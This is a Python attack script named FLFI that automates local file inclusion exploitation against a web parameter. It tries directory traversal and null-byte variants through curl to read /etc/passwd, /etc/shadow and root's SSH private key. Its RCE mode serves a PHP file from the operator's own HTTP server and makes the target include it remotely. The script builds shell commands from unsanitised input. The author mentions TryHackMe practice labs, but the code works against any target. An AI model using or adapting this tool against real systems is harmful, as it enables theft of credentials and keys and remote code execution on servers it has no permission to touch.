### FLFI - Find Local File Inclusion 
# Joshua Knox aka KNINJA
# Because the K is silent...like a ninja.
# October 2021
###

import argparse
import sys
import subprocess
import http.server
import socketserver
import threading

PORT = 8000

class MyParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('\nERROR: %s\n\n' % message)
        self.print_help()
        sys.exit(2)

common_files=[ {
        "name": "/etc/passwd",
        "checks": ["root:x","/bin/bash"],
    },{
        "name": "/etc/profile",
        "checks": ["/etc/profile:", "PATH=" ],
    },{
        "name": "/etc/issue",
        "checks": ["LTS", "Ubuntu"],
    },{
        "name": "/proc/version",
        "checks": ["Linux version"],
    },{
        "name": "/etc/shadow",
        "checks": ["99999:7:::"],
    },{
        "name": "/root/.ssh/id_rsa",
        "checks": ["PRIVATE KEY"],
    }]

# Parse CLI parameters:
parser = MyParser()
parser.add_argument('-u', '--url', dest="url", required=True, type=str, \
    help="Please provide a URL that includes the parameter to be checked \
        against EXAMPLE:  http://10.10.136.177/lab1.php?file=")

parser.add_argument('-f', '--file', dest="search_file", required=False, type=str, \
    help="File to be searched for, if not specified I will attempt to search from \
        a list of common files")

parser.add_argument('-d', '--post-data', dest="post_data", required=False, type=str, \
    help="Option if you want to define a param for a post. THIS IS NOT NEEDED if you include ?<file>= in your url.")

parser.add_argument('-c', '--check', dest="check_str", required=False, type=str, \
    help="A unique string to help identify success.")

parser.add_argument('-A', dest="all_dts", required=False, action='store_true',
    help="Adds uncommon traversal strings.")

parser.add_argument('-P', '--post', dest="use_post", required=False, action='store_true', \
    help="Chagne HTTP method to POST (Default is GET)")

parser.add_argument('-m', '--max', dest="max_depth", required=False, type=str, \
    help="Sets the max depth of traversal.(Default is 12)")

parser.add_argument('-p', '--print', dest="print_file", required=False, action='store_true',
    help="If files results are found print directly to terminal.")

parser.add_argument('--apache2-4-49/50', dest="apache2-4-49", required=False, action='store_true',
    help="Attempts to exploit apache2-4-49/50 CVE-2021-41773/42013")

parser.add_argument('--RCE', dest="rce", required=False, action='store_true',
    help="Will attempt RCE on target. Default is command is 'whoami'")

parser.add_argument('-i', '--ip', dest="host_ip", required=False, type=str, \
    help="Set the local host for RCE")

# Parse Args put new args ^^ above here! lol 
args = parser.parse_args()


# Setting up some vars
url = args.url
s_file = args.search_file
use_post = args.use_post
s_check = args.check_str
print_file = args.print_file
post_data = args.post_data
rce = args.rce
host_ip = args.host_ip
if rce and not host_ip:
    print("!! If RCE is set local host (-i or --ip) needs to be set.")
    quit()


if s_file:
    common_files = [ {
        "name": s_file,
        "checks": [s_check],
    }]

# Common Directory Traversal strings:
dts=['../', '....//',]
# Common and UNCOMMON strings:
if args.all_dts:
    dts=['../', '....//','.%2e/','.%%32%65/']


# Nullbyte strings:
nbyte = ['','/.','%00']

# Max Traversal depth:
max_depth=12


# Check url for http prefix and check for proper format. 
def clean_url(url):
    if ('?' not in url) or ('=' not in url):
        print("\nThe provided URL does not appear to have a query string to check for vulnerabilities. The URL should look something like this: http://10.10.136.177/lab6.php?file=")
        print("If you need more help please check out this room on Try Hack Me: https://tryhackme.com/room/lfibasics")
    if url[0:4] != "http":
        url = "http://" + url
    return url

def dir_trav_curl(url, f):
    prev_len = 0
    curr_len = 0
    print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL <---\n") 
    for i in range(max_depth + 1):
        for sym in dts:
            for nb in nbyte:
                if i == 0:
                    dtr_url = url + f['name'][1:] + nb
                    curr_len=len("[-] TRYING: " + dtr_url)
                    print(" " * prev_len, end='\r', flush=True)
                    # print( * " ", end='\r')
                    print("[-] TRYING: " + dtr_url, end='\r', flush=True)
                    r=subprocess.getoutput("curl -s " + dtr_url)  
                    prev_len=curr_len            
                else:
                    dtr_url = url + (sym * i) +  f['name'][1:] + nb
                    curr_len=len("[-] TRYING: " + dtr_url)
                    print(" " * prev_len, end='\r', flush=True)
                    print("[-] TRYING: " + dtr_url, end='\r', flush=True)
                    #print("[-] TRYING: " + dtr_url)
                    r=subprocess.getoutput("curl " + dtr_url)
                    prev_len=curr_len 
                for check in f['checks']:
                    if check in r:
                        print(" " * prev_len, end='\r', flush=True)
                        return [ url, sym, i, nb ] 
    print("DONE" + (" " * prev_len))
    return 'I got nothing'

def dir_post_curl(url, f):
    prev_len = 0
    curr_len = 0
    print("\n---> TRYING TO USE POST METHOD FOR TRAVERSAL and NULLBYTE CHECK <---\n") 
    if post_data:
        param = post_data
    else:
        param = url.split("?")[1].replace("=", "")
    url = url.split('?')[0]
    for i in range(max_depth + 1):
        for sym in dts:
            for nb in nbyte:
                if i == 0:
                    file_to_try=f['name'] + nb
                    curr_len=len("[-] TRYING: " + param + " " + file_to_try)
                    print(" " * prev_len, end='\r', flush=True)
                    print("[-] TRYING: " + param + " = " + file_to_try, end='\r', flush=True)
                    command = 'curl -s -d "' + param + '=' + file_to_try + '" -X POST ' + url
                    #print(command)
                    r=subprocess.getoutput(command) 
                    #r = requests.post(url, data=param + "=" + file_to_try)
                else:
                    file_to_try = (sym * i) +  f['name'] + nb
                    curr_len=len((sym * i) +  f['name'] + nb)
                    print(" " * prev_len, end='\r', flush=True)
                    print("[-] TRYING: " + param + " " + file_to_try, end='\r', flush=True)
                    command = 'curl -s -d "' + param + '=' + file_to_try + '" -X POST ' + url
                    #print(command)
                    r=subprocess.getoutput(command)
                    #r = requests.post(url, data=param + "=" + file_to_try)
                    prev_len=curr_len 
                for check in f['checks']:
                    if check in r:
                        print(" " * prev_len, end='\r', flush=True)
                        return [ url, param, file_to_try ]
    print("DONE" + (" " * (curr_len + 15)))                   
    return 'I got nothing'
        
def check_all_files_curl(lfi):
    for f in common_files:
        r=subprocess.getoutput("curl " + lfi[0] + (lfi[1] * lfi[2]) + f['name'][1:] + lfi[3])
        for check in f['checks']:
            if check in r:
                print("--------------------------------------------------")
                print("[+] FOUND " + f['name'] + " at: " + lfi[0] + (lfi[1] * lfi[2]) + f['name'][1:] + lfi[3])
                print("--------------------------------------------------\n")
                if print_file:
                    print(r)
                break
    quit()

def check_all_files_post_curl(lfi):
    for f in common_files:
        r=subprocess.getoutput('curl -s -d "' + lfi[1] + '=' + lfi[2] + '" -X POST ' + lfi[0])
        for check in f['checks']:
            if check in r:
                print("----------------------")
                print("[+] FOUND " + f['name'] + " with POST to: " + lfi[0] + " with param: " + "'" + lfi[1] +"'" + " File name: " + lfi[2])
                if print_file:
                    print(r)
                if rce:
                    try_rce(lfi)
                break
    quit()

def start_http_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("Server started at localhost:" + str(PORT))
        httpd.serve_forever()


def try_rce(url):
    print("\n---> ATTEMPTING RCE <---\n") 
    t1 = threading.Thread(target=start_http_server).start()     
    with open('cmd.txt', 'a') as f:
        f.write('<?PHP echo "Hello flfi."; ?>')
    print("curl -s " + url + ":" + str(PORT) + "/cmd.txt")
    r=subprocess.getoutput("curl -s " + url + "http://" + host_ip + ":" + str(PORT) + "/cmd.txt")
    if "Hello flfi." in r:
        print("--------------------------------------------------")
        print("[+] EXECUTED cmd.txt")
        print("--------------------------------------------------\n")
        if print_file:
            print(r)
    
    quit()
    

# LET'S GO! 
url=clean_url(url)
if rce:
    try_rce(url)
for f in common_files:
    answer = dir_trav_curl(url,f)
    if answer != "I got nothing":
        check_all_files_curl(answer)
    if use_post:
        post_curl_answer= dir_post_curl(url, f)
        if post_curl_answer != "I got nothing":
            check_all_files_post_curl(post_curl_answer)

